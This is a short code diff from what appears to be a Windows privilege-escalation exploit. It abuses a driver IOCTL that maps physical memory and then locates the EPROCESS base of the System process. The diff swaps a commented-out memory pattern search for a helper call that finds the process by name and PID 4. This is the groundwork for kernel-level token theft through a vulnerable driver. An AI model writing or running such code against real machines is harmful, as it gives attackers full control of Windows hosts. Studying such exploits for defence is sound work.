@@ -51,27 +51,7 @@ int main(int argc, char** argv)
 	printf("[+] Called IOCTL_MapPhysicalMemoryToLinearSpace successfully. 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
 	printf("[+] Handle to PhysicalMemory: 0x%p\n", hPhysicalMemory);
 
-	//UCHAR ImageFileName[15];
-	unsigned char patt[16] = {
-		"System\0\0\0\0\0\0\0\0\0",
-	};
-	//UCHAR PriorityClass;
-	patt[15] = 0x02;
-	/*
-	
-	std::vector <unsigned __int64> locations;
-	if (searchPhysicalMemory(patt, 16, hPhysicalMemory, locations) == -1) {
-		fprintf(stderr, "[!] searchPhysicalMemory failed.\n");
-		return EXIT_FAILURE;
-	}
-
-	unsigned __int64 patternLocation = locations.back(); // probabilistically the correct value?
-	//0x13aa7e5e7 - 0x13aa7e040 = 0x5A7 (Just a example to calculate the offset)
-	unsigned __int64 EPROCESSBaseOfSystem = patternLocation - 0x5A7;
-	printf("\n------------------------------------\nEPROCESS Base of System: %p\n", (void*)EPROCESSBaseOfSystem);
-	*/
-
-	unsigned __int64 eproc = GetEPROCESSPhysicalBaseOfSystem(hPhysicalMemory);
+	unsigned __int64 eproc = GetEPROCESSPhysicalBase("System", 4, hPhysicalMemory);
 	// do some sanity checks with GetEPROCESSPhysicalBase() as there may be some false positives...
 	printf("\n------------------------------------\nEPROCESS Base of System: %p\n", (void*)eproc);
 
